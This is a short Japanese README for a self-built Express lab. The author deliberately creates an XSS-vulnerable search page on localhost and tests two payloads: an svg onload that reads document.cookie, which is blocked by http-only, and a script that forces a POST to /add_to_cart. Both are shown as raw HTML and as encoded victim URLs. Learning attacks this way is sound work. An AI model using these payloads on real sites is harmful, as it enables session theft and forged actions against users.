# express-training

わざと XSS 脆弱性のあるページを作り、セッションハイジャックを試す。

## 1. XSS で document.cookie をコンソールに表示する

攻撃者が以下の html をクエリパラメータに仕込んで、攻撃対象にクリックさせる。

```html
<svg onload="console.log(document.cookie)">
```

URL はこうなる

```
http://localhost:3333/search?search=%3Csvg+onload%3D%22console.log%28document.cookie%29%22%3E
```

cookie に http-only 属性が付与されていたため、javascript から読むことはできなかった。


## 2. XSS で「レモンをカートに入れる」リクエストを投げさせる

TODO

攻撃者が以下の html をクエリパラメータに仕込んで、攻撃対象にクリックさせる。

```html
<svg onload="fetch('/add_to_cart',{method:'POST'})">
```

URL はこうなる

```
http://localhost:3333/search?search=%3Csvg+onload%3D%22fetch%28%27%2Fadd_to_cart%27%2C%7Bmethod%3A%27POST%27%7D%29%22%3E
```

被攻撃者はこの URL をクリックし、検索結果ページに遷移するが、同時に埋め込まれたスクリプトで /add_to_cart に POST してしまう。
これにより、レモンが一つカートに追加されてしまう。
// TODO csrf トークンが設定されている場合は？
